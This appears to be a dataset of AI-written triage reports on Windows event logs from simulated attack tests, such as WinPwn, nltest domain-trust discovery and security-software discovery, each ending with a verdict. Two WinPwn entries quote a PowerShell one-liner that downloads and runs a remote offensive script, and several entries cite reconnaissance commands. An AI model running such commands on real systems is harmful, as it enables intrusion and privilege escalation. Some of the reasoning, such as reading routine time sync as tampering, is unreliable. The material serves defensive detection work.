The risk here lies in the potential for this reconnaissance activity to be part of a larger sequence of malicious activities. The elevated privileges (SeDebugPrivilege, SeSecurityPrivilege, etc.) associated with the user executing these operations could allow for misuse or unintended actions that may compromise the system further.

**Guidance/Resolution:**

-Since the use of PowerShell with elevated privileges executing scripts for IP enumeration is a strong indicator of suspicious activity and potential network reconnaissance:
- **Resolution: SUSPICIOUS**

**Recommended Actions:**
- Immediately investigate the origin of the PowerShell script to confirm if it was executed legitimately or needs correcting.
- Identify the source and confirm the legitimacy of user actions associated with the account ""admin_test"".
- Ensure security monitoring is heightened to detect any subsequent, potentially malicious activities.
- Consider network segmentation and privileged access management strategies, such as reducing permissions where possible, to mitigate insider threats and unintentional misuse of privileges.
- Continue to monitor for any follow-on activities or access anomalies that could indicate further intrusion attempts."
Security Software Discovery,"Upon analyzing the provided logs, several observations can be made:

1. **Time Synchronization Events:** 
   - Multiple events indicate a change in the system time, which is typically benign and expected behavior when managed by the Windows Time Service (`time.windows.com`). The changes are very minor (milliseconds to seconds), likely due to regular time synchronization.
   - The responsible process is `svchost.exe`, a legitimate Windows process, which aligns with normal system behavior related to time management.

2. **PowerShell Script Execution:**
   - There are several PowerShell invocations where commands are run to check for processes and services related to `Sysmon` and various firewall configurations such as checking `Windows Defender`, `Sysmon`, `Cylance`, and other services. 
   - The commands executed appear to be reconnaissance-related, likely intended to gather information about the system’s security configurations.
   - The presence of these commands might indicate a scripted or automated process that catalogues installed security software. 

3. **Sysmon Events:**
   - Numerous Sysmon event logs detail various processes like `tasklist.exe`, `findstr.exe`, `cmd.exe`, `netsh.exe`, `sc.exe`, and PowerShell being executed. They appear to be executed to enumerate running processes and services related to 'virus', 'defender', and other security products.
   - The execution chain seen in these logs shows `cmd.exe` executing various network shell and PowerShell commands in a command-line script. This behavior could be suspicious depending on the context.
   
4. **Microsoft Edge Update:**
   - Several events related to Microsoft Edge Update show the legitimate update process being run, which is expected behavior for a system with Microsoft Edge installed.
   
5. **Security Logs:**
   - The security logs reinforce time synchronization events and indicate the access of system-level services (NT AUTHORITY), which is common in standard operational contexts.
   
### Assessment:
- **Suspicious Activity Identified:**
  - The logs show that script-based reconnaissance activities are occurring, potentially signatures of a compromised account or an unauthorized scan happening internally.
  - These can indicate suspicious attempts to avoid detection or prepare for further unauthorized activity, especially if not initiated by an IT/systems administration team or automated security processes.
  
### Resolution:
- **SUSPICIOUS:** Given the context, these logs should be classified as suspicious due to the reconnaissance-like activity detected (enumeration of processes related to system defenses) and should be investigated further to ensure the integrity and security of `Server002`.

### Recommendations:
1. **Investigation:** Verify if the observed activities are authorized by checking with IT/security teams for any ongoing or authorized security assessments or scripts running on `Server002`.
2. **Account Monitoring:** Monitor the accounts that executed these commands, notably `SERVER002\\admin_test`, to confirm authentic use and rule out compromised credentials.
3. **Enhance Logging:** Ensure enhanced logging for successful and failed logins, and consider setting up alerts for unusual command execution patterns or privilege escalation attempts.
4. **Network Activity Review:** Review network logs for any unusual outbound connections that coincide with the discovered suspicious activities."
System Time Discovery - PowerShell,"Upon reviewing the provided logs from various sources, here's an analysis of each relevant component to determine the presence of malicious activity:

### 1. **Application Log Analysis:**
   - **Software Protection Platform Service** and **Edge Update Service**: These entries suggest routine operations. The stopping of the Edge Update Service and similar entries don't suggest any malice—services often stop and start as part of typical system operations.

### 2. **Sysmon Log Analysis:**
   - Numerous executions of **wevtutil.exe** and **conhost.exe** under the same administrative user indicate standard Windows processes involved with event log management and command-line interfaces.
   - **PowerShell Execution**: An entry shows that PowerShell executed the ""Get-Date"" command. Executing standard PowerShell commands generally does not indicate malicious activity, especially since the command here simply retrieves the system date.
   - **Edge Update Activity**: The detailed logs involving Microsoft Edge Update components, like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, show normal update operations.

### 3. **Security Log Analysis:**
   - Time adjustments are recorded, something expected where synchronization with time servers like `time.windows.com` occurs. It is not unusual or suspicious, especially given the absence of any privilege escalation or anomaly in logs around these times.

### 4. **System Log Analysis:**
   - Logging of standard operations, including time adjustments confirmed by `svchost.exe`, indicative of normal NTP and system time adjustments. 

### 5. **Windows PowerShell Log Analysis:**
   - The events indicate starting and stopping of PowerShell providers and engine state transitions from available to stopped. The use of a simple ""Get-Date"" command indicates routine execution and can often result from time checks or logging scripts.

### Conclusion:

Following the detailed logs, there are no indicators of anything suspicious or explicitly malicious like rogue process execution or unexpected privilege escalations. The activities logged are consistent with system updates, routine PowerShell usage, and service management.

**Resolution: BENIGN**

Recommendation:
- Ensure that the Windows host's security protocols, such as updated antivirus and incident response procedures, are actively monitored and maintained. Routine assessments should continue to ensure system integrity and security compliance."
Windows Internal pktmon capture,"**Detailed Log Analysis:**

Upon analyzing the provided logs, several observations and potential issues can be noted:

1. **Frequent Use of System Utilities:**
   - The repetitive execution of Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` is documented in the Sysmon logs. While such activities can occur in various administrative contexts, the frequency and clustering of these activities within a short period may signal scripting or automation, which demands further scrutiny under certain circumstances.

2. **Packet Monitoring Tool Execution:**
   - Entries show the use of `pktmon.exe` through `cmd.exe` with specific command-line arguments to start and stop network monitoring. This behavior, especially under an admin context, could indicate network traffic analysis, which, in certain scenarios, might suggest reconnaissance or monitoring post-compromise.

3. **Privilege Elevation:**
   - The security logs reveal that the user `admin_test` was granted several privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`, which are commonly linked to administrative activities. While such privileges could be necessary for legitimate administrative tasks, they are also useful for malicious activities, such as privilege escalation attacks.

4. **Security Logs and Login Activities:**
   - The presence of NTLM-based authentication events linked to numerous logon activities from the workstation `DESKTOP-3HL5B2P` could be legitimate or reflect horizontal movement within a network if unauthorized. The pattern, source, and frequency of these connections should be analyzed in-depth to confirm legitimacy.

5. **Software Installations:**
   - Microsoft Edge update processes are listed in the logs, initiated by the `System` account. While common in enterprise settings, ensuring these updates are legitimate and aligned with the standard patch management process is essential to rule out any tampering.

6. **Command Line Usage:**
   - The complexity in the command line specifically for `cmd.exe` involving `pktmon.exe` (e.g., `/c pktmon.exe start --etw  -f %TEMP%\\data.etl &amp; TIMEOUT /T 5 &gt;nul 2&gt;&amp;1 &amp; pktmon.exe stop`) suggests execution automation, possibly for scheduled tasks or scripts. Verifying the purpose and owner of these scripts is necessary.

Based on the above observations, while there are no definitive signs of compromise, the presence of powerful privileges, frequent utility execution, and network monitoring tools indicate potential reconnaissance or unauthorized access attempts.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. Conduct a thorough review of the user's activities around the noted timestamp, focusing on understanding the necessity and intent behind these actions.
2. Review related access logs and network traffic for signs of unauthorized access or data exfiltration.
3. Ensure that all software updates, such as the Edge installation processes, are verified against the organization's IT administrative procedures to determine legitimacy.
4. Evaluate system integrity through a malware or compromise assessment using endpoint detection and response (EDR) tools to rule out tampering or unauthorized software installations.
5. Reassess user roles and privileges, particularly for `admin_test`, ensuring access levels align with job responsibilities and that usage can be justified.
6. If feasible, engage in behavioral baseline monitoring to detect anomalies.

This resolution indicates investigative follow-up is required to ensure all activities conform with the expected administrative behaviors and organizational security policy."
Griffon Recon,"The analysis of the provided Windows event logs from the specified system, Server002, reveals several key points of interest that require deeper investigation due to their potential connection to suspicious and possibly malicious activities.

### Key Observations:

1. **PowerShell Activity:**
   - A script named `griffon_recon.vbs` located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\griffon_recon.vbs`) was executed via `cscript.exe`, initiated by `powershell.exe`. Scripts run from temporary directories, especially with PowerShell, can be indicative of malicious activity or unauthorized reconnaissance efforts. PowerShell is a legitimate administration tool, but it is often used by attackers to execute payloads because of its powerful capabilities.

2. **Sysmon Logs:**
   - The process creation events show multiple executions of `powershell.exe`, `cscript.exe`, and `conhost.exe` under the user account `SERVER002\admin_test`. The context of these executions seems related to the above-mentioned script.
   - The presence of wevtutil.exe and repeated executions from the `System32` directory, though initially seeming regular, could indicate attempts to interact with Windows Event Logs, possibly to clear logs or hide traces of malicious activity.

3. **Microsoft Edge Updates:**
   - There are extensive logs of Microsoft Edge Update processes. While regular updates for system software are expected, the frequency and repeated engagements suggest these could be being manipulated to either schedule tasks or scan systems under the guise of regular updates. However, note that this activity could also be part of normal update behavior if updates were being pushed at that time.
   - Various executions occur with high integrity levels and are operated by the `NT AUTHORITY\SYSTEM` account, which is a standard administrative level.

4. **Application Logs:**
   - The log data shows Windows Defender is operational, which is a positive sign concerning system protection. No direct logs suggest deactivation or interference.

### Threat Assessment:

- **SUSPICIOUS**: The logs hint at potential recon activity with the execution of the `griffon_recon.vbs` script via PowerShell. This script could possibly be used for gathering detailed system information which might be preparatory work for further actions. Additionally, the execution from a temporary directory raises red flags about potential threats.
- There is no explicit evidence confirming malicious intent or actions like data exfiltration or system damage. However, given the need for heightened vigilance around PowerShell usage and script executions from temporary directories, it requires a careful approach for deeper forensic analysis and verification.

### Suggested Approach:

1. **Further Investigation:**
   - Conduct a detailed investigation of the `griffon_recon.vbs` script if accessible, focusing on its contents and functionality.
   - Verify the lineage and purpose of the PowerShell commands executed, potentially correlating with user activities and timing.
   
2. **Immediate Actions:**
   - Consider isolating the host from the network if further suspicious or unauthorized actions are suspected, to prevent potential lateral movement or further execution of suspect scripts.
   - Execute fully updated antivirus and anti-malware scans, including potential use of advanced threat detection tools if applied by the organization.
   
3. **Monitoring and Alerts:**
   - Increase logging detail and monitoring thresholds briefly for this host to capture real-time evidence of deviations from expected behavior.
   - Set up alerts for unusual PowerShell activity or script execution from temporary directories or atypical processes like `cscript`.

In conclusion, while no blatantly malicious activity is confirmed, the markers suggest further scrutiny for potential threats. Therefore, labeled as **SUSPICIOUS**, with recommendations for additional action steps in an abundance of caution against potential compromise vectors."
Windows - Discover domain trusts with nltest,"Based on the Sysmon logs, we are seeing some potentially unusual command lines, particularly with the use of `cmd.exe` and `nltest.exe`. Here’s a breakdown of the analysis that leads to the determination:

1. **Command Line Execution with `cmd.exe` and `nltest.exe`**: We observed the use of `cmd.exe` with the command:
   - `""cmd.exe"" /c WHERE nltest.exe >NUL 2>&1`
   - `""cmd.exe"" /c nltest /domain_trusts & nltest /trusted_domains`

   The use of `WHERE` followed by redirection to `NUL` is typical in scripts or automated programs that check for file existence without displaying output. The use of `nltest.exe` commands is often associated with network and domain trust information gathering, which can be benign in administrative scripts but could also indicate lateral movement activities.

2. **Multiple `wevtutil.exe` Execution**: We see repeated execution of `wevtutil.exe`, a utility used to manage event logs, which might indicate evasion or log tampering. Multiple instances were spawned:
   - This could be part of administrative scripts or procedures. However, without a clear context, it potentially raises suspicion for log manipulation attempts.

3. **Consideration of User Context and Timing**: 
   - All processes are executed under the `SERVER002\admin_test` account with High Integrity Level, which suggests high privileges. 
   - Events are tightly packed in time, possibly indicating automated scripting rather than manual administrative actions.

4. **Edge Update Activities**: Another large section involves Microsoft Edge update processes. These seem consistent with normal update operations (e.g., `MicrosoftEdgeUpdate.exe`, `Install`, `ComRegisterShell64.exe`) under `NT AUTHORITY\SYSTEM`. While these are expected activities, they should be monitored as attackers sometimes use such processes as cover.

5. **Service Stop Logs**: The application logs include service stop entries for `edgeupdate`. This aligns with normal update processes restarting services and does not inherently suggest malicious activity. 

**Assessment and Conclusion**:

- **Benign**: Most of the EdgeUpdate activities appear consistent with expected behavior for system updates.
- **Suspicious**: The use of `cmd.exe` with `nltest.exe` and repeated calls to `wevtutil.exe` under a high-privilege account warrants further investigation. In an isolated context, the use of these commands could highlight reconnaissance or lateral movement activity often staged by attackers.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a deeper investigation into the context of these activities. Check for additional indicators of compromise such as unusual network traffic, domain controller authentication events, or other host activity around this timeframe.
- Verify whether the `admin_test` account used for these actions has legitimate reasons for running these tools and commands.
- Assess recent changes to policies or scripts that might account for these actions.
- Increase monitoring around the user account and processes to quickly identify any further suspicious actions."
Permission Groups Discovery PowerShell (Local),"To evaluate the logs with a focus on identifying possible malicious activity or anomalies, let's analyze the available events.

### Key Observations:

1. **Time Change Events (Security Log Events 4616):**
   - There are events indicating the system time was adjusted. These events may not be concerning on their own as they could be related to legitimate time synchronization activities. However, in an incident scenario, unauthorized time changes might be used to modify timestamp evidence in logs.

2. **User Logon and Privilege Events:**
   - Event 4624 and 4672 indicate logon session activity and privilege assignment for the user **admin_test**. The privilege set is extensive, including sensitive privileges like `SeDebugPrivilege`, which can be abused for malicious intent if not used legitimately. 
   - The logon type 3 suggests network logons, which are common for remote access, possibly indicating remote administration. However, the presence of legitimate credentials (assuming no alerts regarding password changes or password sharing) lowers the immediate suspicion.

3. **Group Membership Reconnaissance:**
   - Log `PowerShell Log` suggests the execution of commands that list local group memberships, potentially indicating reconnaissance. This can be part of routine administrative activities or an early indicator of lateral movement in network attacks if the querying user shouldn't typically perform these tasks.

4. **Sysmon Events:**
   - Sysmon logs reveal the frequent launch of `wevtutil.exe` and `conhost.exe`. The activity involves the user `SERVER002\admin_test`. These processes managing event logs and console windows could be benign but could also correlate with activities of an attacker attempting to access or clear logs.
   - There are entries showing `whoami.exe` and `hostname.exe` executions—common reconnaissance commands. If not part of routine operations, they can signify a presence trying to gather system information.
   - The `MicrosoftEdgeUpdate.exe` activities primarily reflect update and service operations for MS Edge, which appear to be typical and not directly raising red flags.

5. **Powershell Usage:**
   - The execution of powershell scripts mainly queries for local administrator group members. This can be normal for administrative tasks but also aligns with potential pre-attack reconnaissance.

### Assessment:
- **SUSPICIOUS:** The activity seen, particularly around privilege assignment, PowerShell usage for reconnaissance, and usage of `wevtutil.exe` combined with frequent reconnaissance commands, merits further investigation.
  
### Recommendations:
- **Actions Needed:**
  1. Verify the legitimacy of the `admin_test` activity. Determine if the user should have executed commands related to privilege escalation and group reconnaissance.
  2. Conduct an internal review of access and privilege controls related to the `admin_test` account.
  3. Investigate if the time-change events correlate with any user-initiated actions or unusual logs elsewhere (possibly in application logs).
  4. Cross-reference the system’s expected behavior during the timestamp and any concurrent alerts at that time.

In conclusion, while some logs might suggest routine administrative actions, their context in the entire sequence suggests further scrutiny to confirm legitimacy or uncover potential gaps in security practices."
Remote System Discovery - arp,"Upon reviewing the provided Windows event logs, a detailed analysis highlights several points worth considering:

### Suspicious or Anomalous Behavior:

1. **High-Integrity Level Execution**:
   - There are multiple instances where processes like `cmd.exe`, `arp.exe`, and `whoami.exe` are executed with High integrity levels. While these can be standard operations, the presence of `arp -a` suggests an enumeration command, often used for network reconnaissance. This can be suspicious if not aligned with normal administrative activities.

2. **Multiple Uses of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` is used to query or manage Windows event logs. It is seen multiple times under the user `SERVER002\admin_test`. Its extensive use along with `conhost.exe` seems excessive without context, possibly indicating an attempt to scrape logs or conduct event log manipulation.

3. **Network Scanning Commands:**
   - The invocation of `arp -a` could indicate network scanning activities, typically used to view the Address Resolution Protocol cache to understand the network structure.

4. **Abuse of Privileges**:
   - The event ID 4672 shows that the `admin_test` account has privileges like `SeDebugPrivilege`, potentially indicating the capacity for debugging system processes, which is powerful enough for malicious actions if misused.

5. **Time Change Activity**:
   - There are logs indicating time changes on the system (Event ID 4616). While this may have legitimate reasons, it can also be associated with attempts to cover tracks or confuse log generation. 

6. **Unauthorized Access or Abnormal Account Usage**:
   - The security logs record NTLM logons using NTLMv2, which, while not inherently malicious, can be checked against the norm of Kerberos authentication in Active Directory environments to ensure this wasn’t anomalous.

### Potential Malicious Activity or Compromise:

1. **Unauthorized Command Execution**:
   - Certain command-line operations (e.g., execution of `arp`, `whoami`, and `cmd.exe`) should not occur frequently under service accounts or without administrative tasks as context.

2. **Repeated Execution of `Sysmon` Logs**:
   - Events show a very repetitive pattern of Sysmon logs without much variation, which could indicate some form of automated script running that utilizes these tools - potentially malicious if it is not recognized as a scheduled task.

### Assessment:

- Based on the logs, the activities of `admin_test` appear abnormal given the use of high privilege commands and extensive event log utility uses, suggesting either a well-staffed and actively maintained server or potential misuse.
  
### Conclusion:

**Resolution**: **SUSPICIOUS**

Steps to Proceed:
1. **Conduct a Further Investigation**:
   - Authenticate the operations performed by `SERVER002\admin_test`. Verify if the user is conducting legitimate administrative tasks or if the account was compromised.
   
2. **Review Change in System Time**:
   - Investigate if the time change aligns with scheduled tasks or service requirements.

3. **Network and Process Review**:
   - Check network logs for unusual patterns or outgoing connections from Server002, especially post arp command.
   
4. **Use of Privileges**:
   - Audit the necessity and usage of `SeDebugPrivilege`, `SeBackupPrivilege`, and other sensitive privileges on this server.

5. **Behavioral Monitoring**:
   - Implement continuous monitoring on the processes and their associated network activities for any indication of planned data exfiltration or further reconnaissance commands.

By carrying out the above checks and implementing stricter monitoring, potential malicious activity can be either confirmed or ruled out with greater certainty."
Security Software Discovery - powershell,"Upon reviewing the provided logs, several details stand out that require careful consideration for potential security implications:

1. **PowerShell Activity:**
   - The logs show repeated execution of a PowerShell command that queries processes with descriptions or names matching patterns commonly associated with antivirus or security products (e.g., `*virus*`, `*carbonblack*`, `*defender*`, `*cylance*`, `*mc*`, `Sysmon`). 
   - This behavior is concerning because it suggests an attempt to detect and possibly evade these particular security applications, which is a common tactic used by malicious actors to disable or bypass security solutions.

2. **System Time Manipulation:**
   - The System and Security logs show entries about the system time being adjusted back by approximately 5 seconds. The responsible process is `svchost.exe`, running under `NT AUTHORITY\SYSTEM`.
   - While these entries alone might seem benign if related to legitimate time synchronization tasks, in combination with other suspicious activities, they could point towards attempts to hinder log correlation which is a known tactic by threat actors to cover their tracks.

3. **Extensive Sysmon Logging of Known Windows Processes:**
   - The Sysmon logs capture numerous launches of common Windows binaries such as `hostname.exe`, `whoami.exe`, `conhost.exe`, among others, all initiated by the user `SERVER002\admin_test` and typically linked to normal system operations.
   - Nonetheless, the frequency and clustering of these executions, especially surrounding a notably suspicious PowerShell command execution, could indicate script or operational task automation which should be verified if expected.

4. **Microsoft Edge Update Processes:**
   - Several instances of `MicrosoftEdgeUpdate.exe` and related binaries are seen executing within a short timeframe, as logged in the Sysmon logs. These appear to be standard update processes for Microsoft Edge and don't inherently show indicators of compromise under usual circumstances.

**Assessment:**

- The PowerShell execution with the intention to list or check processes related to security software indicates a red flag for potentially malicious activity. This behavior is often seen in malware that is attempting to check which defensive measures are active to either disable them or to tailor its execution according to detected security software.
- Time adjustments by a `svchost.exe` process running under the `NETWORK SERVICE` account may indicate an attempt to obfuscate log traceability, especially when occurring concurrently with suspicious script execution.
- The sheer volume of legitimate process activity, although common, requires validation with expected baseline activity.

**Resolution: SUSPICIOUS**

Given the indicators gathered, particularly the PowerShell commands focused on discovering security software and the time manipulation by `svchost.exe`, the activities observed in the logs are suspicious. It requires further investigation and validation with baseline activity for the host. Here are some recommended steps:

1. **Immediate Investigation:**
   - Investigate the origin of the PowerShell commands to determine if they were executed by an authorized user or an automation task. Validation against typical usage patterns is required.
   - Inspect system and security logs correlation to verify if such time adjustments are common and if any other logs might have been influenced.

2. **Monitoring and Response:**
   - Increase monitoring on the host for further PowerShell executions and any other signs of privilege escalation or lateral movement.
   - If this behavior deviates from expected operational tasks, consider isolating the host for a deeper forensic analysis.

3. **Engage Security Controls:**
   - Ensure all security tools are active and updated. Review security policies that affect PowerShell usage and process execution visibility.

This activity would benefit from a context of user behavior on the system and further coordination with endpoint security and network traffic analysis to piece together any anomalous behavior patterns potentially indicative of malicious intrusion attempts."
List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Upon examining the given event logs from the Sysmon, Application, System, Security, and PowerShell logs, here's an analysis and assessment of the activities recorded:

### Analysis:

1. **Sysmon Logs:**
   - **Legitimate Processes:** Various legitimate Windows processes such as `whoami.exe`, `conhost.exe`, `MpSigStub.exe`, `wuauclt.exe` (Windows Update), and `MpCmdRun.exe` (Defender command-line tool) are executed primarily by the `NT AUTHORITY\SYSTEM` user or an administrator account. These processes and their respective actions (e.g., fetching machine identity with `whoami`, running updates) are generally expected and part of normal system operations.
   - **Edge Update Processes:** There are multiple events involving `MicrosoftEdgeUpdate.exe` and associated components like `MicrosoftEdgeUpdateSetup_X86`, operating under `NT AUTHORITY\SYSTEM`. This sequence of events reflects normal update activity for the Edge browser, which is an expected system process.

2. **Application Logs:**
   - **Windows Defender On:** The log notes that Windows Defender is active, which is a good sign of ongoing protection.
   - **Edge Update:** The logs show that Edge update services start and stop, aligning with the Sysmon logs indicating an update process, suggesting these are part of regular scheduled updates.

3. **System Logs:**
   - **Windows Updates:** The logs highlight Security Intelligence Updates for Microsoft Defender completed successfully. These updates are consistent with normal operation.
   - **Time Changes:** Kernel-General events reflecting minor time adjustments indicate regular time synchronization, possibly with an NTP server, which is standard behavior.

4. **Security Logs:**
   - **No Alarming Security Events:** No explicit signs of malicious actions like unauthorized logons, privilege escalations, or security policy changes.

5. **PowerShell Logs:**
   - **No Entries:** There are no logs indicating potentially harmful use of PowerShell scripts. Lack of log entries could suggest nothing noteworthy from PowerShell or no utilization at the logged time.

### Assessment:

- **Benign Operations:** The observed activities predominantly consist of regular system maintenance tasks, software updates, and normal system operations executed by authorized system processes/users. The absence of unknown or suspicious applications, unexpected use of scripting tools like PowerShell, or abnormal access patterns reinforces that the system behaviours captured are part of standard operations.

### Conclusion:
- **Resolution**: BENIGN - The logs reviewed represent benign activity with no indicators of compromise or unusual activities that would warrant suspicion.

**Guidance for Future Monitoring:**
- Ensure continuous monitoring for potential anomalous or abnormal process activities, especially those that involve high-integrity levels not attributed to expected system processes.
- Keep an eye open for unauthorized user activities or unknown process executions which could be indicative of malicious intent.
- Regular review and updating of security policies and ensure that alerts are configured appropriately for critical events in your IT environment."
Basic Permission Groups Discovery Windows (Local),"Upon reviewing the provided logs, here are the key observations based on potential indicators of malicious activity or compromise:

1. **Command Execution and Privilege Escalation:**
   - The Sysmon logs indicate a series of executions involving `cmd.exe` with command lines pertaining to group listing (`net localgroup`) and administrative privileges. This activity is initiated by the user `SERVER002\admin_test` who has a high integrity level. The `cmd.exe` process is a known entry point for executing arbitrary commands; hence, without proper context, these actions could be seen as suspicious, especially if this user activity is not expected or typical for `admin_test`.

2. **Edge Update Activities:**
   - The logs show several entries related to Microsoft Edge Update. It involves processes like `MicrosoftEdgeUpdate` executing with various command-line arguments associated with updates and registration actions. While these entries can be standard for automatic updates, their frequency and the paths used (e.g., `Temp` directory) require verification that these activities align with scheduled update practices.

3. **Time Change Events:**
   - There were two instances where the system time was changed (`EventID: 4616`) within a short period, which might stem from routine time synchronization services but could indicate attempts to alter timestamps for activities. The changing of system time should be correlated with other activities in the logs to determine if it might be aiding in concealing certain actions.

4. **Audit Event:**
   - A Security log entry (`EventID: 4799`) shows an action involving the ""Administrators"" group. This corresponds with the `net1.exe` execution from the Sysmon logs, further hinting at modifications or access checks on groups within the system.

**Assessment:**

- **BENIGN:** Routine updates and user group checks could explain the logs. However, considering potential risks:
- **SUSPICIOUS:** The frequent invocation of command-line tools for listing groups and the actions related to the Edge Update, while possibly legitimate, may not be typical behavior. Suspicion arises primarily from the repeated administrative-level processes invoked by `admin_test`.
- **MALICIOUS:** Without concrete evidence of compromise or unauthorized actions, it's challenging to decisively categorize these logs as malicious solely based on the data provided.

**Resolution:** **SUSPICIOUS**

**Guidance:**

1. **Verification of User Activity:**
   - Confirm whether the user `admin_test` was performing legitimate administrative tasks during this period. Validate actions against a baseline of normal operations for this account.
   
2. **Validate Edge Update Configuration:**
   - Ensure Edge Update processes and their execution paths are in line with official update tasks and not indicative of tampered software or potential payload distribution methods.

3. **Audit Logs Correlation:**
   - Cross-reference the system time changes and administrative actions with other logs and user reports to ensure no malicious activity was concealed or facilitated.

4. **Implement Monitoring and Alerts:**
   - Enhance monitoring for similar usage of `cmd.exe` with administrative arguments and set up alerts for unusual patterns indicating privilege escalation or unauthorized group modifications.

Proceed with a focused examination to rule out any potential adversarial activities, leveraging additional context from system behavior and user intentions."
WinPwn - Powersploits privesc checks,"Upon reviewing the provided logs, several indicators point toward potentially malicious activity, particularly focusing on the PowerShell events reported in the Windows PowerShell log. Here's a detailed analysis of the key points:

1. **Suspicious PowerShell Execution**:
   - The logs show multiple instances of PowerShell activity involving the downloading and execution of a script from the domain ""raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn"". The PowerShell execution line provided is:
     ```
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     ```
   - This behavior is suspicious as it indicates that a script is being executed directly from the internet, which is typically associated with malicious activity such as downloading and executing malware or conducting further reconnaissance.

2. **Use of 'Invoke-Expression' (iex)**:
   - The use of 'iex' (Invoke-Expression) is recognized as a technique often employed by attackers to obfuscate commands or execute malicious scripts.

3. **Lack of Correlation with Authorized Activities**:
   - There is no legitimate business explanation given for why a script from this particular GitHub repository would be executed in such a manner. Scripts that are externally sourced should undergo scrutiny and validation before execution, especially on servers.

4. **Privilege Context**:
   - The actions are performed under a high-integrity level, leveraging ""SERVER002\\admin_test"" credentials, suggesting potentially administrative privilege use. This can potentially lead to privilege escalation if the context is running malicious activities with elevated rights.

5. **Activity Timeline**:
   - The rapid sequence of PowerShell logging events, all within the same minute, raises further suspicion of scripted or automated processes being executed rather than manual administrative tasks.

6. **System and Security Logs**:
   - No correlated unusual activity or overt compromise indications appeared in the System or Security logs, but the presence of such PowerShell commands itself remains a significant red flag.

### Threat Assessment:

Given the evidence presented, the PowerShell logs clearly show suspicious behavior needing further investigation. The actions taken are consistent with phases of a cyber-attack where the attacker performs reconnaissance or attempts privilege escalation with downloaded scripts.

### Recommended Action:

1. **Isolate the Host**: Prevent any further access to the network from this server until it can be secured.
2. **Detailed Forensic Analysis**: A deeper analysis should be conducted on ""Server002"" to identify any other indicators of compromise, track down the history of script execution, and analyze any accessed systems or data.
3. **Review User Activities**: Scrutinize user ""admin_test"" activities in terms of recent system accesses, especially involving elevated permissions.
4. **Community and Intelligence Check**: Confirm if ""WinPwn.ps1"" or the source URL is recognized by threat intelligence sources for confirmed malicious use.

### Conclusion:

Resolution: **MALICIOUS**

The PowerShell activities recorded within these logs indicate probable unauthorized or malicious actions. Proceed with caution and ensure containment and investigation steps are prioritized to protect the network environment."
WinPwn - itm4nprivesc,"Upon analyzing the provided Windows event logs, I have identified some activities and behaviors of note:

### System and Security Logs:
1. **Time Change Events (Event ID 1 & 4616)**: These logs indicate time synchronization activities. Time synchronization is typically benign and expected as servers often sync their time with designated time servers. No unusual source for time synchronization has been identified, indicating these changes are likely normal system operations.

2. **Time Service Events (Event ID 35)**: The source being a common NTP server (`time.windows.com`) and the stratum number being within a normal range (4), supports that the time synchronization is benign.

### Application Log:
1. **Windows Defender Active**: Windows Defender is reported as active, which is a positive sign indicating antivirus protection is running.

### Sysmon Logs:
1. **Process Execution Anomalies**: 
   - The execution of `powershell.exe` with the command: 
     ```
     ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), itm4nprivesc -noninteractive -consoleoutput}
     ```
     This is highly suspicious. It indicates a potentially malicious PowerShell script being executed from a remote URL, possibly downloading and executing further scripts without user consent.
   - There are calls to utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` under the same user session. These are often benign but when seen together, particularly with the PowerShell command, they might suggest post-exploitation activities or reconnaissance.

### Windows PowerShell Logs:
1. **PowerShell Execution Details**: It corroborates with the Sysmon logs the execution of potentially malicious PowerShell commands/scripts which are downloaded from an external source (GitHub repository). This behavior is commonly associated with malicious activity involving downloading and executing scripts that could be used for privilege escalation or other nefarious purposes.

### Assessment:
The presence of a sophisticated command execution that downloads and executes a script from an external, possibly untrusted source is a significant indicator of potential malicious activity. This suggests an attempt at privilege escalation or remote code execution.

### Conclusion: **MALICIOUS**

Given the severity and nature of the PowerShell command shown in the logs, it's appropriate to classify the activity observed here as **malicious**. This type of script execution is often indicative of a compromise.

### Recommended Actions:
1. **Immediate Containment**: Isolate the affected host (`Server002`) from the network to prevent further spread or communication with any external malicious infrastructure.
2. **Conduct a Full Malware Scan**: Run detailed antivirus and anti-malware scans to detect any persisting threats.
3. **Review and Control User Access**: Check for any unauthorized or unnecessary administrative access on the system.
4. **Network Traffic Analysis**: Inspect network logs to identify any communication initiated by the server externally, especially to unfamiliar or suspicious domains.
5. **Incident Response**: Engage your incident response team to conduct further analysis and determine the root cause, extent of compromise, and eradicate the threat.
6. **Patch and Update Systems**: Ensure all systems and software are adequately patched and updated to mitigate exploitation of known vulnerabilities.

This finding requires serious and immediate attention to ensure that any potential threat is neutralized and future incidents are prevented."
Qakbot Recon,"In evaluating the provided Windows event logs, several potentially suspicious activities warrant further examination. Let's break down the key findings:

1. **Event ID 4624 (Logon Success):** Multiple NTLM logons for the user ""admin_test"" occur. While the use of NTLM is not inherently suspicious, monitoring for abnormal login patterns is vital. Logon type 3 indicates a network logon, which could suggest remote access.

2. **Event ID 4672 (Special Privileges Assigned):** The same user ""admin_test"" is observed being granted a range of high-privilege rights, including SeDebugPrivilege. This is particularly sensitive, as it enables processes to debug other processes, a capability that can be exploited for malicious reasons.

3. **Event ID 5379 (Credential Validation):** Several failed operations with return code ""3221226021"" are noted. This return code typically indicates a failed login due to a bad password, potentially indicating brute force attempts or a misconfigured authentication service.

